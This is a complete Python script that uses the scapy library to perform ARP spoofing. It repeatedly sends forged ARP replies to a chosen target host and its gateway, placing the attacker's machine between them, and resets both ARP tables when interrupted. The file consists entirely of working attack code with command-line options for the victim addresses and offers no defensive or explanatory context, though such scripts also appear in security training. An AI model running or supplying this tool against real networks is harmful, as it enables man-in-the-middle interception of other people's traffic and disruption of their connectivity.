#!/usr/bin/env python
import scapy.all as scapy
import time
import optparse
# import sys # for python 2


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP address")
    parser.add_option("-g", "--gateway", dest="gateway", help="Gateway/AccessPoint IP address")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a Target IP Address, use --help for more info.")
    elif not options.gateway:
        parser.error("[-] Please specify a Gateway/AccessPoint IP Address, use --help for more info.")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(tgt_ip, spoof_ip):
    target_mac = get_mac(tgt_ip)
    packet = scapy.ARP(op=2, pdst=tgt_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


opts = get_arguments()
target_ip = opts.target
gateway_ip = opts.gateway
sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")  # for python 3
        # for python 2
        # print("\r[+] Packets sent: " + str(sent_packets_count)),  # comma at the end to not print new line
        # sys.stdout.flush()  # flush the buffer and print the line
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resetting ARP tables ... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

